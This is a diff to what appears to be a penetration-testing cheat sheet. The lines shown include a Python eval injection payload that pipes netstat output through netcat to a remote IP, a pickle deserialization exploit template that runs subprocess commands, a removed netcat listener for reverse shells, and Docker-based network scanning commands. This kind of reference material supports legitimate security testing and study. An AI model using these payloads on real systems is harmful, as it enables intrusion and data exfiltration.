@@ -149,9 +149,19 @@ Python eval() and 2.7 read() exploit:
 
 `__import__("os").system("netstat -antp|nc 192.168.203.130 1234")`
 
-Netcat listen for reverse shell:
+##### Deserialization (Pickle) exploit template
+```python
+def create_command(cmd, args, flags):
+    template = """csubprocess
+check_output
+(((S'{0}'
+S'{1}'
+S'{2}'
+ltR."""
+    return template.format(cmd, args, flags)
 
-`nc -v -n -l -p 1234`
+hack = create_command('ls', '..', '-la')
+```
 
 Port knocking 
 
@@ -802,5 +812,7 @@ Get path of container in host file structure:
 transfer docker image to host by using `root@kali:~/# docker save uzyexe/nmap -o nmap.tar` and after copying on target:
 ```bash
 docker load -input nmap.tar
-docker run --network=br0 -it --rm uzyexe/nmap -sn -T4 -v 10.10.10.0/24
+docker run --network=br0 -it --rm uzyexe/nmap -sn -T4 -v 10.10.10.0/24 >scan.out &
 ```
+
+Identify if you are inside a container - `cat /proc/self/cgroup | grep docker`
